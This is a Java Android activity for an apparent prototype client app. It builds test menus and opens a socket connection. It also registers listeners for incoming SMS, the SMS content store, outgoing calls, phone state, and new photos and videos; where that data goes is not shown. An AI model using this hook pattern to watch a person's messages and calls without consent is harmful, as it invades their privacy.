package com.internetruntime.androidclient;

import java.io.File;
import java.util.Timer;
import java.util.TimerTask;

import com.example.internetruntime.androidclient.R;
import com.internetruntime.androidclient.Communication.HttpDriver;
import com.internetruntime.androidclient.Communication.SocketDriver;
import com.internetruntime.androidclient.DeviceManager.CameraDriver;
import com.internetruntime.androidclient.DeviceManager.DeviceManager;
import com.internetruntime.androidclient.DeviceManager.NewPicReceriver;
import com.internetruntime.androidclient.DeviceManager.NewVideoReceiver;
import com.internetruntime.androidclient.DeviceManager.PhoneReceiver;
import com.internetruntime.androidclient.DeviceManager.PicCompresser;
import com.internetruntime.androidclient.DeviceManager.SMSObserver;
import com.internetruntime.androidclient.DeviceManager.SMSReceiver;
import com.internetruntime.androidclient.UI.ListMenu;
import com.internetruntime.androidclient.UI.MenuItem;
import com.internetruntime.androidclient.UI.UIActivity;
import com.internetruntime.androidclient.UI.UIConsole;
import com.internetruntime.androidclient.UI.UIConst;
import com.internetruntime.androidclient.UI.UILogField;
import com.internetruntime.androidclient.UI.UIMenu;
import com.internetruntime.androidclient.UI.UIMenuButtonItem;
import com.nineoldandroids.view.ViewPropertyAnimator;

import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.IntentFilter.MalformedMimeTypeException;
import android.util.Log;
import android.view.Menu;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.RelativeLayout;
import android.widget.TextView;

public class MainActivity extends UIActivity {

	public static DeviceManager dm;
	public static SocketDriver socketClient;
	public static EventHandler eventHandler;
	
	
	@Override
	protected void onActivityResult(int requestCode, int resultCode, Intent data) {
		// TODO Auto-generated method stub
		super.onActivityResult(requestCode, resultCode, data);
		if (resultCode == RESULT_OK)
		{
			if (requestCode == CameraDriver.CAMERA_REQUEST_CODE)
			{
				Log.d("comm", "Activity Result!");
				dm.handlePicture();
			}
			
		}
	}
	
	
	
	
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		
		UIConst.Init(this);
		
		requestWindowFeature(Window.FEATURE_NO_TITLE);
		getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,  WindowManager.LayoutParams.FLAG_FULLSCREEN);
		setContentView(R.layout.activity_main);
		clock();
		regDeviceReceiversAndOberservers();
		
		
		
		
		Log.d("tag", "after clock");
		
		socketClient = new SocketDriver("1", "1", this);
		socketClient.connect();
		
		
		
		
		
		ListMenu menu1 = new ListMenu(this);
		
		MenuItem item1 = new MenuItem(this);
		item1.setText("test1");
		MenuItem item2 = new MenuItem(this);
		item2.setText("test2");
		MenuItem item3 = new MenuItem(this);
		item3.setText("test2");
		MenuItem item5 = new MenuItem(this);
		item5.setText("test2");
		MenuItem item4 = new MenuItem(this);
		item4.setText("test2");
		
		menu1.addItem(item1);
		menu1.addItem(item2);
		menu1.addItem(item3);
		menu1.addItem(item4);
		menu1.addItem(item5);
		start(menu1);
		getMainLayout().addView(menu1);
		
		ListMenu menu2 = new ListMenu(this);
		MenuItem item21 = new MenuItem(this);
		item21.setText("test1");
		MenuItem item22 = new MenuItem(this);
		item22.setText("test2");
		menu2.addItem(item21);
		menu2.addItem(item22);
		getMainLayout().addView(menu2);
		
		item1.setSubMenu(menu2);
		
		
//		TextView hello = (TextView) findViewById(R.id.label);
//		ViewPropertyAnimator.animate(hello).setDuration(3000).rotationYBy(720).x(100).y(100);
		
		/*
		final UIMenu menu = new UIMenu(this);
		
		for (int i = 0; i < 5; i++)
		{
			final UIMenuButtonItem button = new UIMenuButtonItem(this);
			button.setWidth(UIConst.BTN_WIDTH);
			button.setHeight(UIConst.BTN_HEIGHT);
			button.setText("Test " + i);
			button.setClickListener(new OnClickListener() {
				
				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					Log.d("ui", "clicked!");				
					menu.showSubMenu(menu.indexOf(button));
					
				}
			});
			menu.addItem(button);
		}
		Init(menu);
		
		UIConsole console = new UIConsole(this);
		
		console.setWidth(UIConst.CONSOLE_WIDTH);
		console.setHeight(UIConst.CONSOLE_HEIGHT);
		console.setBackground(UIConst.CONSOLE_BACKGROUNG);
		console.render(getMainLayout());
		
		final UIMenu AnotherMenu = new UIMenu(this);
		for (int i = 0; i < 3; i++)
		{
			final UIMenuButtonItem button = new UIMenuButtonItem(this);
			button.setWidth(UIConst.BTN_WIDTH);
			button.setHeight(UIConst.BTN_HEIGHT);
			button.setText("More" + i);
			button.setClickListener(new OnClickListener() {
				@Override
				public void onClick(View v) {
					// TODO Auto-generated method stub
					Log.d("ui", "clicked!");
//					AnotherMenu.hide(AnotherMenu.indexOf(button));
				}
			});
			AnotherMenu.addItem(button);
		}
		menu.get(0).setRelativeMenu(AnotherMenu);
		
//		UILogField logField = new UILogField(this);
//		logField.render();
		*/
	}
	
	

	public boolean regDeviceReceiversAndOberservers()
	{
		dm = new DeviceManager(this);
		//new pic revceriver
		NewPicReceriver newPicReceriver = new NewPicReceriver(dm);
		IntentFilter newPicReceriverIntentFilter = new IntentFilter();
		newPicReceriverIntentFilter.addAction("android.hardware.action.NEW_PICTURE");
		try {
			newPicReceriverIntentFilter.addDataType("image/*");
		} catch (MalformedMimeTypeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		registerReceiver(newPicReceriver, newPicReceriverIntentFilter);
		
		//new video revceriver
		NewVideoReceiver newVideoReceiver = new NewVideoReceiver(dm);
		IntentFilter newVideoReceiverFilter = new IntentFilter();
		try {
			newVideoReceiverFilter.addDataType("video/*");
		} catch (MalformedMimeTypeException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}
		newVideoReceiverFilter.addAction("android.hardware.action.NEW_VIDEO");
		registerReceiver(newVideoReceiver, newVideoReceiverFilter);
		
		//get new sms revceriver
		SMSReceiver smsReceiver = new SMSReceiver(dm);
		IntentFilter smsReceiverIntentFilter = new IntentFilter();
		smsReceiverIntentFilter.addAction("android.provider.Telephony.SMS_RECEIVED");
		registerReceiver(smsReceiver, smsReceiverIntentFilter);
		
		//phone receiver
		PhoneReceiver phoneReceiver = new PhoneReceiver(dm);
		IntentFilter phoneReceiverIntentFilter = new IntentFilter();
		phoneReceiverIntentFilter.addAction("android.intent.action.NEW_OUTGOING_CALL");
		phoneReceiverIntentFilter.addAction("android.intent.action.PHONE_STAT");
		registerReceiver(phoneReceiver, phoneReceiverIntentFilter);
		
		
		ContentResolver cr = getContentResolver();
		//send new sms oberserver
		cr.registerContentObserver(Uri.parse("content://sms/"), true, new SMSObserver(new Handler(), dm, cr));
		
		
		return true;
	}
	
	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}
	
	@Override
	public void onBackPressed() {
		// TODO Auto-generated method stub
		super.onBackPressed();
	}
	
	public void clock() {
		Timer t = new Timer();
		TimerTask tt = new TimerTask() {
			private int count = 0;
			@Override
			public void run() {
				// TODO Auto-generated method stub
				count++;
				Log.d("tag", String.valueOf(count));
			}
		};
		t.schedule(tt, 0, 3000);
	
	}

}
